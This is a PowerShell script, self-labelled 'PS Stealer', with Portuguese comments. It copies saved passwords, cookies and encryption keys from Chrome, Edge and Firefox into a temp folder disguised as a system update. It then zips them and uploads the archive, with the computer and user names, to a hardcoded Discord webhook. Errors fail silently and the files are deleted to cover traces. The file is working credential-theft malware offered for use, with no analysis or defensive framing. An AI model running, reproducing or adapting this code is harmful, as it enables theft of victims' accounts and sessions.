# language: PowerShell, file: stealer.ps1

$WebhookURL = "https://discord.com/api/webhooks/1566895786594275419/vem9aBfT1ZEtUoYstFvnMtJlXkGsxWF3nTls132_doU0iMT1n3TEa9SQo4K3dPy0tVQN"
$TempDir = "$env:TEMP\sys_update_$(Get-Random -Minimum 1000 -Maximum 9999)"
$ZipFile = "$env:TEMP\logs.zip"

# 1. Cria a pasta temporária e copia os dados
New-Item -ItemType Directory -Force -Path $TempDir | Out-Null

# Chrome
$ChromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
if (Test-Path $ChromePath) {
    New-Item -ItemType Directory -Force -Path "$TempDir\Chrome" | Out-Null
    Copy-Item -Path "$ChromePath\Login Data" -Destination "$TempDir\Chrome\LoginData" -ErrorAction SilentlyContinue
    Copy-Item -Path "$ChromePath\Network\Cookies" -Destination "$TempDir\Chrome\Cookies" -ErrorAction SilentlyContinue
    Copy-Item -Path "$ChromePath\Local State" -Destination "$TempDir\Chrome\LocalState" -ErrorAction SilentlyContinue
}

# Edge
$EdgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
if (Test-Path $EdgePath) {
    New-Item -ItemType Directory -Force -Path "$TempDir\Edge" | Out-Null
    Copy-Item -Path "$EdgePath\Login Data" -Destination "$TempDir\Edge\LoginData" -ErrorAction SilentlyContinue
    Copy-Item -Path "$EdgePath\Network\Cookies" -Destination "$TempDir\Edge\Cookies" -ErrorAction SilentlyContinue
    Copy-Item -Path "$EdgePath\Local State" -Destination "$TempDir\Edge\LocalState" -ErrorAction SilentlyContinue
}

# Firefox
$FirefoxPath = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $FirefoxPath) {
    Get-ChildItem -Path $FirefoxPath -Directory | ForEach-Object {
        New-Item -ItemType Directory -Force -Path "$TempDir\Firefox" | Out-Null
        Copy-Item -Path "$($_.FullName)\logins.json" -Destination "$TempDir\Firefox\logins.json" -ErrorAction SilentlyContinue
        Copy-Item -Path "$($_.FullName)\key4.db" -Destination "$TempDir\Firefox\key4.db" -ErrorAction SilentlyContinue
        Copy-Item -Path "$($_.FullName)\cookies.sqlite" -Destination "$TempDir\Firefox\cookies.sqlite" -ErrorAction SilentlyContinue
    }
}

# 2. Compacta os dados
Compress-Archive -Path "$TempDir\*" -DestinationPath $ZipFile -Force

# 3. Prepara o Embed do Discord
$PcName = $env:COMPUTERNAME
$UserName = $env:USERNAME
$PayloadJSON = @{
    embeds = @(
        @{
            title = "🏴‍☠️ Painel - $PcName"
            color = 16711680
            fields = @(
                @{
                    name = "🌐 INFORMAÇÕES"
                    value = "```diff`n+ PC: $PcName`n+ User: $UserName```"
                    inline = $false
                }
            )
            footer = @{
                text = "ZYON HUB | PS Stealer"
            }
        }
    )
} | ConvertTo-Json -Depth 10

# 4. Envia pro Discord
try {
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    $bodyLines = (
        "--$boundary",
        "Content-Disposition: form-data; name=`"payload_json`"$LF",
        $PayloadJSON,
        "--$boundary",
        "Content-Disposition: form-data; name=`"file`"; filename=`"logs.zip`"",
        "Content-Type: application/zip$LF",
        [System.IO.File]::ReadAllText($ZipFile),
        "--$boundary--$LF"
    ) -join $LF

    Invoke-RestMethod -Uri $WebhookURL -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines
} catch {
    # Falha silenciosa
}

# 5. Limpa os rastros
Start-Sleep -Seconds 2
Remove-Item -Path $TempDir -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item -Path $ZipFile -Force -ErrorAction SilentlyContinue
